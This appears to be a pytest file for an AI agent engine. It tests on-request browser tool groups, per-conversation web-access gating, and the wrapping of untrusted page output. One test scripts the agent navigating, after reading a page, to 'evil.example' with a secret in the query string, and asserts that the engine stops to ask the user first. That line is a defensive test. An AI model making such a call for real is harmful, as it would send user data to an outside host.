"""The browser group is on request even when "send only the tools a task needs" is off (roadmap §4): its ~13 tools
would otherwise ride along with every task. Fixtures come from test_engine."""
from types import SimpleNamespace

import pytest

from aethel.tools.base import Assessment, Tool, ToolResult
from tests.fakes import tool_call
from tests.test_engine import h, plan  # noqa: F401  (h is a fixture)

pytestmark = pytest.mark.anyio


@pytest.fixture
def k(h):  # noqa: F811
    """h, plus a fake browser tool (group "browser") and a fake Word tool (group "office") in each engine's registry."""
    made, calls = [], []

    def fake(name, group):
        async def run(args, ctx):
            calls.append(name)
            return ToolResult(True, f"{name} ran", untrusted=group == "browser")

        return Tool(name, f"{name}.", {"type": "object"}, "read", run,
                    lambda a: Assessment("allow", "", a.get("url") or name), toolgroup=group)

    def make(turns, *, groups_on=False, browser=True, **kw):
        h.settings.update({"token_saving": {"tool_groups": groups_on}})
        engine, provider = h.make(turns, settings=h.settings, **kw)
        for name, group in (("word_new", "office"), *((("browser_navigate", "browser"),) if browser else ())):
            engine.registry.unregister(name)
            engine.registry.register(fake(name, group))
        made.append(engine)
        return engine, provider, calls

    yield SimpleNamespace(h=h, make=make)
    for engine in made:
        for name in ("word_new", "browser_navigate"):
            engine.registry.unregister(name)


async def run(h, engine, web=True, goal="look something up"):  # noqa: F811
    """A task in a conversation with the web on (the browser is web access: without it, no browser)."""
    conv = h.convs.create()
    h.convs.set_web(conv.id, web)
    task_id = await engine.start(conversation_id=conv.id, goal=goal)
    await engine.wait_idle()
    return task_id


async def test_with_groups_off_every_tool_is_offered_except_the_browsers(k):
    engine, provider, _ = k.make([[plan(["Look it up"])], [tool_call("finish_task", summary="Done.")]])
    await run(k.h, engine)
    first = provider.tools_seen[1]
    assert {"fs_read", "word_new", "complete_plan_step", "finish_task"} <= set(first)   # everything else, as before
    assert "browser_navigate" not in first and "use_tools" in first                      # the browser is on request
    system = provider.calls[1][0].content
    assert "More tools on request (call use_tools): browser (" in system and "office (" not in system
    use = next(s for s in provider.specs_seen[1] if s.name == "use_tools")
    assert use.parameters["properties"]["group"]["enum"] == ["browser"]


async def test_the_planner_sees_the_browser_as_a_group_not_as_thirteen_tools(k):
    turns = [[tool_call("submit_plan", steps=["Look it up"], checks=[], tool_groups=["browser"])],
             [tool_call("browser_navigate", call_id="n1", url="https://example.com")],
             [tool_call("finish_task", summary="Done.")]]
    engine, provider, calls = k.make(turns)
    await run(k.h, engine)
    prompt = provider.calls[0][1].content
    assert "word_new" in prompt and "browser_navigate" not in prompt and "browser (" in prompt
    planner = next(s for s in provider.specs_seen[0] if s.name == "submit_plan")
    assert planner.parameters["properties"]["tool_groups"]["items"]["enum"] == ["browser"]
    assert "browser_navigate" in provider.tools_seen[1] and "use_tools" not in provider.tools_seen[1]   # asked for up front
    assert calls == ["browser_navigate"]


async def test_asking_for_the_browser_adds_it_with_a_quiet_note(k):
    turns = [[plan(["Look it up"])], [tool_call("use_tools", call_id="u", group="browser")],
             [tool_call("browser_navigate", call_id="n", url="https://example.com")],
             [tool_call("finish_task", summary="Done.")]]
    engine, provider, calls = k.make(turns)
    task_id = await run(k.h, engine)
    assert "browser_navigate" not in provider.tools_seen[1] and "browser_navigate" in provider.tools_seen[2]
    assert "More tools on request" not in provider.calls[2][0].content           # nothing left to ask for
    assert [e["text"] for e in k.h.events if e["type"] == "task_note"] == ["Asked for browser tools"]
    assert [s.tool for s in k.h.tasks.steps(task_id)] == ["browser_navigate"]    # use_tools is not a step
    assert calls == ["browser_navigate"]


async def test_calling_a_browser_tool_without_asking_still_works(k):
    turns = [[plan(["Look it up"])], [tool_call("browser_navigate", call_id="n", url="https://example.com")],
             [tool_call("finish_task", summary="Done.")]]
    engine, provider, calls = k.make(turns)
    await run(k.h, engine)
    assert calls == ["browser_navigate"] and "browser_navigate" in provider.tools_seen[2]


async def test_without_a_browser_nothing_changes_and_there_is_no_use_tools(k):
    engine, provider, _ = k.make([[plan(["x"])], [tool_call("finish_task", summary="Done.")]], browser=False)
    await run(k.h, engine)
    assert "use_tools" not in provider.tools_seen[1] and "More tools on request" not in provider.calls[1][0].content
    assert "tool_groups" not in next(s for s in provider.specs_seen[0] if s.name == "submit_plan").parameters["properties"]


async def test_with_groups_on_the_browser_is_just_another_group(k):
    engine, provider, _ = k.make([[plan(["x"])], [tool_call("finish_task", summary="Done.")]], groups_on=True)
    await run(k.h, engine)
    assert "browser (" in provider.calls[1][0].content and "office (" in provider.calls[1][0].content
    assert "word_new" not in provider.tools_seen[1] and "browser_navigate" not in provider.tools_seen[1]


async def test_a_learned_skill_about_the_browser_brings_the_group_with_it(k):
    engine, _, _ = k.make([[plan(["x"])]])
    engine.knowledge = SimpleNamespace(get=lambda i: {"apps": ["browser"], "macro_def": None})
    assert engine._skill_groups(["s1"]) == {"browser"}
    engine.knowledge = SimpleNamespace(get=lambda i: {"apps": ["notepad"], "macro_def": {"steps": [
        {"tool": "browser_navigate"}, {"tool": "win_click"}]}})
    assert engine._skill_groups(["s1"]) == {"browser"}                         # a macro step that uses a browser tool


# ---- the browser is web access (review I6) ------------------------------------------------------------------------
async def test_with_the_web_off_for_the_conversation_there_is_no_browser_at_all(k):
    turns = [[plan(["x"])], [tool_call("browser_navigate", call_id="n", url="https://example.com")],
             [tool_call("finish_task", summary="Done.")]]
    engine, provider, calls = k.make(turns)
    await run(k.h, engine, web=False)
    assert "browser_navigate" not in provider.tools_seen[1] and "use_tools" not in provider.tools_seen[1]
    assert "browser_* tools" not in provider.calls[0][0].content and "browser_* tools" not in provider.calls[1][0].content
    assert "More tools on request" not in provider.calls[1][0].content
    reply = next(m.content for m in provider.calls[2] if m.role == "tool")
    assert reply.startswith("Error: web access is off for this conversation") and calls == []     # a guessed call is refused


async def test_private_mode_keeps_the_browser_off_even_when_the_conversation_says_on(k):
    from tests.fakes import factory_from
    engine, provider, calls = k.make([[plan(["x"])], [tool_call("finish_task", summary="Done.")]])
    k.h.settings.update({"private_mode": True, "roles": {"agent": [{"provider": "local", "model": "local"}]}})
    engine.router.factory = factory_from({"local:local": provider})
    await run(k.h, engine, web=True)
    assert provider.tools_seen and "browser_navigate" not in provider.tools_seen[1] and "use_tools" not in provider.tools_seen[1]


async def test_turning_the_web_off_mid_task_takes_the_browser_away(k):
    turns = [[plan(["x"])], [tool_call("use_tools", call_id="u", group="browser")],
             [tool_call("browser_navigate", call_id="n1", url="https://a.example")],
             [tool_call("browser_navigate", call_id="n2", url="https://b.example")], [tool_call("finish_task", summary="Done.")]]
    engine, provider, calls = k.make(turns)
    first = engine.registry.get("browser_navigate").handler

    async def navigate_then_switch_off(args, ctx):
        result = await first(args, ctx)
        for c in k.h.convs.list():
            k.h.convs.set_web(c.id, False)
        return result

    engine.registry.get("browser_navigate").handler = navigate_then_switch_off
    await run(k.h, engine)
    assert calls == ["browser_navigate"]                                          # the second navigation never ran
    assert "browser_navigate" not in provider.tools_seen[3]
    assert next(m.content for m in provider.calls[4] if m.role == "tool" and "web access is off" in m.content)


# ---- opening an address nobody gave, after outside content, asks (review C3) --------------------------------------
async def test_after_reading_a_page_navigating_to_an_address_nobody_gave_needs_the_user_s_ok(k):
    from tests.test_engine import until
    turns = [[plan(["x"])], [tool_call("use_tools", call_id="u", group="browser")],
             [tool_call("browser_navigate", call_id="n1", url="https://first.example/")],          # nothing read yet
             [tool_call("browser_navigate", call_id="n2", url="https://evil.example/?d=the+secret")]]
    engine, provider, calls = k.make(turns)
    conv = k.h.convs.create()
    k.h.convs.set_web(conv.id, True)
    task_id = await engine.start(conversation_id=conv.id, goal="look something up")
    asked = await until(k.h.events, lambda e: e["type"] == "approval_needed")
    assert asked["tool"] == "browser_navigate" and "evil.example" in asked["summary"]
    assert "didn't come from you or a search result" in asked["reason"]
    assert calls == ["browser_navigate"]                                           # only the first one ran
    await engine.cancel(task_id)
    await engine.wait_idle()


async def test_an_address_the_user_wrote_in_the_goal_needs_no_approval_after_a_page_was_read(k):
    turns = [[plan(["x"])], [tool_call("use_tools", call_id="u", group="browser")],
             [tool_call("browser_navigate", call_id="n1", url="https://first.example/")],
             [tool_call("browser_navigate", call_id="n2", url="https://mine.example/page")],
             [tool_call("finish_task", summary="Done.")]]
    engine, provider, calls = k.make(turns)
    await run(k.h, engine, goal="look at https://mine.example/page and https://first.example/")
    assert calls == ["browser_navigate", "browser_navigate"]
    assert [e for e in k.h.events if e["type"] == "approval_needed"] == []


# ---- a result with no snapshot is not a newer snapshot (review I4) -------------------------------------------------
async def test_a_stateless_result_neither_hides_the_real_snapshot_nor_counts_as_unchanged(k):
    big = "- generic [ref=e1]:\n" + "".join(f'  - link "item {i}" [ref=e{i + 2}]\n' for i in range(60))

    def page_tool(name, stateless):
        async def run_(args, ctx):
            return ToolResult(True, "Done." if stateless else big, untrusted=True, stateless=stateless)
        return Tool(name, name, {"type": "object"}, "read", run_, lambda a: Assessment("allow", "", name),
                    observes="page", toolgroup="core")  # read tier: a tainted task would wait to be asked about a write

    k.h.settings.update({"token_saving": {"mask_superseded": True, "mask_batch": 1}})
    turns = [[plan(["x"])], [tool_call("look", call_id="l1")], [tool_call("quiet", call_id="q1")],
             [tool_call("quiet", call_id="q2")], [tool_call("finish_task", summary="Done.")]]
    engine, provider, _ = k.make(turns, browser=False)
    engine.registry.register(page_tool("look", False))
    engine.registry.register(page_tool("quiet", True))
    try:
        await run(k.h, engine)
    finally:
        engine.registry.unregister("look")
        engine.registry.unregister("quiet")
    last = [m.content for m in provider.calls[-1] if m.role == "tool"]
    assert last[0].startswith("<untrusted") and "item 59" in last[0]                  # the real snapshot is still there
    assert last[1] == '<untrusted source="quiet">\nDone.\n</untrusted>' and last[2] == last[1]   # not "[unchanged: ...]"
